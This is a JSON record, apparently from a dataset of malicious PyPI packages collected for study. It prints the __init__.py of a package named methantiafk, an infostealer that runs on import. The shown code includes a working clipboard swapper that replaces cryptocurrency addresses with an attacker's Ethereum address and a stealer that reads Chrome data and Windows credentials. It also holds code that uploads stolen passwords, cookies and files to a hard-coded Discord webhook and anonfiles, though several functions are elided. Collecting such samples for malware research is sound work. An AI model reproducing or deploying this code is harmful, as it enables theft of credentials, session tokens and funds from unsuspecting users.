[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/methantiafk-0.0.2/methantiafk-0.0.2/methantiafk/__init__.py",
    "malicious_code": "import os\nimport re\nimport json\nimport base64\nimport shutil\nimport ntpath\nimport random\nimport asyncio\nimport sqlite3\nimport zipfile\nimport win32gui\nimport win32con\nimport requests\nimport threading\nimport pyperclip\nimport subprocess\nimport httpx\nimport psutil\nimport ctypes\nimport time\nimport pyperclip\nimport subprocess, sys\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': 'False',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'no',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'none',\n    'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': 'none',\n    'addresse_ada': 'none',\n    'addresse_dash': 'none',\n    'blprggg': [ ... ]\n}\n\n# --- Clipboard Crypto Address Swapper ---\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Main Stealer Class (bl4ckc4p) ---\n# This class steals browser passwords, cookies, credit cards, Discord tokens, Minecraft, Roblox, screenshots, system info, and exfiltrates to Discord webhook\nclass bl4ckc4p:\n    def __init__(self):\n        self.dscap1 = \"https://discord.com/api/v9/users/@me\"\n        self.w3bh00k = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        inf, net = self.sys_1fo(), self.net_1fo()\n        self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]\n        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.h00ksreg = \"api/webhooks\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.regex = 'https://pastebin.com/raw/f4PM9Dse' # Used for token regex\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.ids = []\n        self.sep = os.sep;\n        self.robloxcookies = [];\n        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, \"Local State\"));\n        os.makedirs(self.dir, exist_ok=True);\n    # ... (methods omitted for brevity, see full code above)\n    # The methods in this class perform the following malicious actions:\n    # - Steal browser passwords, cookies, credit cards, Discord tokens, Minecraft, Roblox, screenshots, system info\n    # - Write all data to temp directory, zip it, and exfiltrate to Discord webhook\n    # - Inject malicious JS into Discord desktop app for persistence and further token stealing\n    # - Optionally kill Discord and related processes to force restart and reinfection\n    # - Optionally add itself to Windows startup\n    # - Optionally display fake error to hide real activity\n    # - Optionally hide its window\n    # - Optionally evade analysis/VMs\n    # - Optionally replace clipboard crypto addresses\n    # - Optionally search for interesting files and exfiltrate them\n    # (See full code for all details)\n\n# --- Data Exfiltration and File Search ---\n# The following code searches for files with sensitive keywords and uploads them to anonfiles and Discord webhook\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef fetch_conf(e: str) -> str or bool | None:\n    return __config__.get(e)\n\nhook = fetch_conf(\"yourwebhookurl\")\n\n# ... (DATA_BLOB, CryptUnprotectData, DecryptValue, LoadRequests, LoadUrlib, Trust, Reformat, upload, writeforfile, getPassw, getCookie, checkIfProcessRunning, ZipThings, GatherAll, uploadToAnonfiles, blackcapedezFolder, blackcapedezFile, blackcapedez)\n# All these functions are used to steal passwords, cookies, and files, and exfiltrate them to the attacker's webhook or anonfiles\n\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]